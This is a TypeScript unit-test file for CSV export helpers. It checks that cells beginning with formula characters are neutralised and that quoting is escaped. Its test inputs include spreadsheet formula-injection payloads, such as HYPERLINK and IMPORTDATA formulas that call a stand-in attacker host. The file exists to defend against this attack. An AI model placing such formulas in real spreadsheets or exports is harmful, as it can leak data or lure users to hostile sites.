import assert from "node:assert/strict";
import test from "node:test";
import { buildCsvFromObjectRows, buildCsvFromRows, buildCsvRow } from "./csv-utils";

test("overtime object-row exports neutralize formula-like business data", () => {
  const csv = buildCsvFromObjectRows([{
    Employee: '=HYPERLINK("https://attacker.example")',
    Client: " \t=SUM(A1)",
    Notes: "@IMPORTDATA(\"https://attacker.example\")",
    Minutes: -60,
  }]);

  assert.match(csv, /"'=HYPERLINK\(""https:\/\/attacker\.example""\)"/);
  assert.match(csv, /' \t=SUM\(A1\)/);
  assert.match(csv, /"'@IMPORTDATA\(""https:\/\/attacker\.example""\)"/);
  assert.match(csv, /,-60$/m);
});

test("invoice row exports protect all direct formula sigils", () => {
  const csv = buildCsvFromRows([[
    "=SUM(A1)",
    "+CMD",
    "-CMD",
    "@SUM(A1)",
    123.45,
  ]]);

  assert.equal(csv, "'=SUM(A1),'+CMD,'-CMD,'@SUM(A1),123.45");
});

test("admin client backup rows protect control-prefixed formulas and CSV syntax", () => {
  const csv = buildCsvFromRows([[
    "\t=HYPERLINK(\"https://attacker.example\")",
    "\r\n+SUM(A1)",
    "Doe, \"Jane\"\nSecond line",
  ]]);

  assert.match(csv, /^"'\t=HYPERLINK\(""https:\/\/attacker\.example""\)"/);
  assert.match(csv, /"'\r\n\+SUM\(A1\)"/);
  assert.match(csv, /"Doe, ""Jane""\nSecond line"$/);
});

test("scheduled backup row helper preserves normal signed numbers", () => {
  assert.equal(
    buildCsvRow(["Normal name", " normal text", -42, 18]),
    "Normal name, normal text,-42,18",
  );
});